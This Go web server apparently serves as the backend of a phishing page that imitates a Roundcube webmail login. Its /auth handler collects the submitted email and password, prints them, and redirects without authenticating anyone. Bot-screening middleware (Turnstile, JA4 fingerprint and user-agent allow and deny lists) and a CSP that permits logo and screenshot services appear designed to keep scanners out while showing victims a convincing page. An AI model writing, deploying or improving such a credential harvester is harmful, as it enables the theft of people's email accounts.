package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"

	"github.com/joho/godotenv"
	"github.com/lulexhostt/authapp/middlewares"
	"gopkg.in/yaml.v2"
)

// BotGuardConfig struct for YAML file configuration.
type BotGuardConfig struct {
	MinVer string `yaml:"min_ver"`
	Ja4    struct {
		Allow []struct {
			B string `yaml:"b"`
		} `yaml:"allow"`
		Deny []struct {
			B string `yaml:"b"`
		} `yaml:"deny"`
	} `yaml:"ja4"`
	UserAgent struct {
		Allow []struct {
			Browser string `yaml:"browser"`
			Version string `yaml:"version"`
		} `yaml:"allow"`
		Deny []struct {
			Browser string `yaml:"browser"`
		} `yaml:"deny"`
	} `yaml:"user_agent"`
}

// setCSP sets the Content Security Policy header for security.
func setCSP(w http.ResponseWriter) {
	w.Header().Set("Content-Security-Policy", "default-src 'self' https://logo.clearbit.com; img-src 'self' https://image.thum.io https://roundcube.secure.ne.jp https://i.imgur.com https://logo.clearbit.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ajax.googleapis.com https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://logo.clearbit.com https://image.thum.io https://baloncard.online; frame-src https://challenges.cloudflare.com;")
}

// authHandler handles the authentication logic.
func authHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	// Check if Turnstile challenge was already validated
	token := r.URL.Query().Get("cf-turnstile-response")
	if token == "" {
		// Redirect to a challenge page or show an error message
		http.Redirect(w, r, "/challenge", http.StatusSeeOther)
		return
	}

	// Verify Turnstile token if present
	success, err := middlewares.TurnstileVerify(token)
	if err != nil || !success {
		http.Error(w, "Turnstile verification failed", http.StatusForbidden)
		return
	}

	// Handle the form submission logic
	if r.Method == http.MethodPost {
		r.ParseForm()
		email := r.FormValue("rcmloginuser")
		password := r.FormValue("rcmloginpwd")
		fmt.Printf("Email: %s, Password: %s\n", email, password)
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	// Render the auth.html form template if the request is GET
	tmpl, err := template.ParseFiles("templates/auth.html")
	if err != nil {
		http.Error(w, "Unable to load template", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// loadConfig loads the BotGuard YAML configuration file.
func loadConfig() (*BotGuardConfig, error) {
	configPath, err := filepath.Abs("config/botguard.yaml")
	if err != nil {
		return nil, err
	}
	data, err := os.ReadFile(configPath) // Use os.ReadFile to load config
	if err != nil {
		return nil, err
	}
	var config BotGuardConfig
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}
	return &config, nil
}

func main() {
	// Load environment variables from .env file
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error loading .env file: %v", err)
	}

	// Load the BotGuard configuration
	config, err := loadConfig()
	if err != nil {
		log.Fatalf("Error loading config: %v", err)
	}
	fmt.Printf("Loaded BotGuard config: %+v\n", config)

	// Set up routes and middlewares
	mux := http.NewServeMux()
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	mux.Handle("/auth", middlewares.TurnstilePreloadMiddleware(middlewares.BotProtection(middlewares.RateLimiter(middlewares.SecurityHeaders(http.HandlerFunc(authHandler))))))

	// Start the server
	fmt.Println("Server is running on port 8080...")
	http.ListenAndServe(":8080", mux)
}
